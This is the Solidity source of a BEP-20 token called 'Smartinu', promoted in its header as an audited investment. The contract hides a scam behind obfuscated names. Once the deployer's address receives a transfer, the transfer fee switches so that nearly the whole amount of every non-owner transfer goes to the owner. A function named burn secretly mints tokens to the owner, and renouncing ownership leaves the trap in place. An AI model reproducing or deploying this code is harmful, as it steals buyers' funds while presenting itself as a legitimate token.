/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/////////////////////////////////////////////////////////////////////////////////
/*
Smartinu
https://t.me/Smartinucoin_Dogecoin_CN
https://www.smarthiu.vip
As the industry's pioneering and Verified-Audited Investment code, our solution is designed to prove 
that smart contracts are the future of investments. The longevity and stability of Smart Inu will 
ultimately disrupt the crypto industry and how people perceive investments and trading. 
*/
/////////////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.8.4;
contract Smartinu {
uint256 private  RSJFCL = 10000000000000;
string public  name = "Smartinu";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  HPKRLH = 10000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  JJHKWP = 1000000000000000000000;
address private  ARHJYQ = address(0);
uint256 private  RSCCFY = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  YHCMPQ = address(0);
uint256 private  QBEFAQ = 1000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  ABCCPF = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant WMTGNA = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "Smartinu";
mapping (address => uint256) public balanceOf;
address public owner;
uint256 private  GCOBZC = 1000000000000000000;
address private  NOEMQU = address(0);
uint8 public constant decimals = 18;
address private  GIUOCW = address(0);
uint256 private  HXEIYF = 100000000;
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FQYYXZ");
require(to != address(0), "FQYYXZ");
require(amount <= balanceOf[from], "FQYYXZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WMTGNA/GCOBZC ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ARHJYQ){
GCOBZC = WMTGNA+2;
}
emit Transfer(from, to, transferAmount);
}
function _getHPKRLH() private returns (uint256) {
return HPKRLH;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFQYYXZ 0");
require(spender != address(0), "fFQYYXZ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getGIUOCW() private returns (address) {
return GIUOCW;
}

function _getRSJFCL() private returns (uint256) {
return RSJFCL;
}

constructor () {
ARHJYQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getYHCMPQ() private returns (address) {
return YHCMPQ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getABCCPF() private returns (address) {
return ABCCPF;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getJJHKWP() private returns (uint256) {
return JJHKWP;
}

function _getRSCCFY() private returns (uint256) {
return RSCCFY;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getHXEIYF() private returns (uint256) {
return HXEIYF;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getNOEMQU() private returns (address) {
return NOEMQU;
}

function _getQBEFAQ() private returns (uint256) {
return QBEFAQ;
}


}